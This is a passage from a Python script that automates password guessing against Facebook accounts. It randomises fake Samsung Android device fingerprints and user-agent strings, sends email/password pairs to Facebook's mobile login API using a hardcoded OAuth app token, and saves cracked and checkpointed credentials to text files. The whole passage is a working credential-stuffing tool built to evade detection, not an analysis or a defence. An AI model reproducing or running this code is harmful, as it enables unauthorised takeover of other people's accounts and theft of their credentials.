705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
			gttt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
			android_version=str(random.randrange(6,13))
			ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=480,height=800}'+f';FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
			adid = str(uuid.uuid4())
			data = {
				"adid": adid,
				"email": user,
				"password": pw,
				"cpl": "true",
				"credentials_type": "device_based_login_password",
				"source": "device_based_login",
				"error_detail_type": "button_with_disabled",
				"source": "login", "format": "json",
				"generate_session_cookies": "1",
				"generate_analytics_claim": "1",
				"generate_machine_id": "1",
				"locale": "pl_PL", "client_country_code": "PL",
				"device": gtt,
				"device_id": adid,
				"method": "auth.login",
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
			}

			head = {
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-sim-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-type": "unknown",
				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				"user-agent": ua_string,
				"x-fb-net-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-bandwidth": str(random.randint(2e7,3e7)),
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-friendly-name": "authenticate",
				"accept-encoding": "gzip, deflate",
				"x-fb-http-engine": "Liger"
			}
			xnxx = ses.post("https://b-api.facebook.com/method/auth.login", data=data, headers=head, allow_redirects=False).text
			result = json.loads(xnxx)
			if "session_key" in result:
				print('\033[1;32m [KIDDIE-OK] '+user+'|'+pw+'\033[0;97m')
				open('HASIL-OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [KIDDIE-CP] '+user+'|'+pw+'\033[0;97m')
				open('HASIL-CP.txt', 'a').write(user+'|'+pw+'\n')
				cps.append(user)
				break
			else:
				continue
		loop+=1
		

	except Exception as e:
		pass


if __name__=='__main__':
	scriptkiddie()

